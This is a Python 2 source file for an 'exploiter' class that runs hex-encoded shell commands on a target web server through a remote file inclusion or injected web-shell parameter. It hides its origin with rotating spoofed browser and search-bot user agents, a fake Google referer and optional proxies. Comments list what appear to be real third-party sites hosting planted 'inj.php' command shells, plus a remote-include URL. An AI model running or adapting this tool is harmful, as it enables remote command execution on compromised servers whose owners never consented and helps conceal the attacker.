import urllib2, random
try: multi
except NameError: from threading import Thread as multi


class exploiter(multi):
    global headers
    headers=[[('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)')],
             [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')],
             [('User-agent', 'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)')],
             [("IE 7 Vista","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)")],
             [("Googlebot 2.1","Googlebot/2.1 (http://www.google.com/bot.html)")],
             [("Opera 9 (final) WinXP","Opera/9.00 (Windows NT 5.1; U; en)")],
             [("MSN Bot","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)")],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 4.0; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 5.5; Windows NT)')],
             [('User-agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT)')],
             [("MSIE6 WinXP","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")]]

    def __init__(self, include, proxy, target):
        multi.__init__(self)
        self.include=include
        self.proxy=proxy 
        self.cmd='export TERM=linux'
        self.target=target


    def __get_site__(self, url):
        #proxy syntax => proxy:port

        if  self.proxy is None or self.proxy == '':
            opener = urllib2.build_opener()
        else:
            
            prox = "http://"+self.proxy
            proxies = urllib2.ProxyHandler({"http" : prox})
            opener = urllib2.build_opener(proxies)
           
        i = random.randrange(0,6,1)
        opener.addheaders = headers[i]
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        req.add_header('Referer', 'http://www.google.com/')
        f = urllib2.urlopen(req)
        
        return  f.read()
        f.close()

        
    def toHex(self, s):
        lst = []
        for ch in s:
            hv = hex(ord(ch)).replace('0x', '%')
            if len(hv) == 1:
                hv = '0'+hv
            lst.append(hv)
        
        return reduce(lambda x,y:x+y, lst)


    def html_to_text(self, s):
      """
      Given an HTML formatted str, convert it to a text str.
      """
      #s = re.sub(r'<.*?>', '', s)
      s = s.replace('\n\r', '\n')
      s = s.replace('\n\n', '\n')
      #s = s.replace('\t', ' ')
      s = s.replace('&amp;', '&')
      s = s.replace('&lt;', '<')
      s = s.replace('&gt;', '>')
      s = s.replace('&quot;', '"')
      s = s.replace('&middot;', '\xb7')
      for i in range(256):
        s = s.replace('&#%d;' % i, chr(i))
      #while s.replace('  ', ' ') != s:
      #  s = s.replace('  ', ' ')
      return s



    def StripTags(self,text):
       finished = 0
       while not finished:
         finished = 1
         start = text.find("<")
         if start >= 0:
             stop = text[start:].find(">")
             if stop >= 0:
                 text = text[:start] + text[start+stop+1:]                
                 finished = 0
       return text


    def SetCmd(self, cmd):
        self.cmd = cmd

    def SetProxy(self, proxy):
        self.proxy = proxy

    def run(self):
        #stat = exploiter(exploit,proxy, url)
        #stat = exploiter(exploit="",proxy="216.73.53.2:80",target="")
        #url="http://www.rp-sol.com/inj.php?cmd="
        #url="http://www.ecosdearagon.com/inj.php?cmd="
        #url="http://iberoriente.net/inj.php?md="
        #url="http://www.ttclinux.com/inj.php?md="
        #"http://127.0.0.1:8080/cshell.php?act=cmd&cmd=dir&cmd_txt=1&submit=Execute"
        #url="http://gcc.shaunt.org/index.php?page=http://input.site.io/well/seen.txt?&id="
        #url="http://127.0.0.1:8080/inj.php&md="
        #prompt=url.split('/')[2]
        #prompt =  '['+prompt+']$ '
        #md=raw_input(prompt)
        cmd=self.toHex(self.cmd)
        data=self.__get_site__(self.target+self.include+cmd)
        data=self.StripTags(data)
        return self.html_to_text(data)





    


